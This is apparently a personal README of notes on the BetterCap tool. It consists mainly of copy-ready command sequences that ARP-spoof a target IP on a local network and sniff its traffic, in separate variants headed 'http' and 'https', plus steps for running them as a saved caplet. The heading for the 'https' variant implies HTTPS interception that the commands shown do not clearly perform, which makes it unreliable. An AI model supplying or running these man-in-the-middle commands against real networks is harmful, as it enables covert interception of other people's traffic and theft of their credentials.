# BetterCap

<p align="center">
  <img alt="BetterCap" src="https://raw.githubusercontent.com/bettercap/media/master/logo.png" height="140" />

## To start with the program

Firstally install the bettercap if not installed yet. To check write the bettercap hepl command `bettercap --help`
</br>Then to start the bettercap with the below command.
<p align="center">
  bettercap iface <b>name_of_interface</b>
</p>

## spoof.cap - http://

net.probe on
</br>set arp.spoof.fullduplex true
</br>set arp.spoof.target `target IP`
</br>arp.spoof on
</br>net.sniff on

## spoof.cap - https://

net.probe on
</br>net.recon on
</br>set arp.spoof.fullduplex true
</br>set arp.spoof.target `target IP`
</br>arp.spoof on
</br>set net.sniff.local true
</br>net.sniff on

## bettercap caplet

Copy the commands from <b>spoof.cap</b>, then edit it with the `target_IP` and save it in some directory with name "<i><b>spoof.cap</b></i>". Now, move to the particular directory and run the command below:
<p align="center"></br>bettercap -iface <b>name_of_interface</b> -caplet spoof.cap</p>

## Decleration

<p align="center">
  <i>I do not own this program/software/script. Neither I have the license to distributr/sell. This is for self understanding/remembering and easy access across systems for myself.</i>
</p>
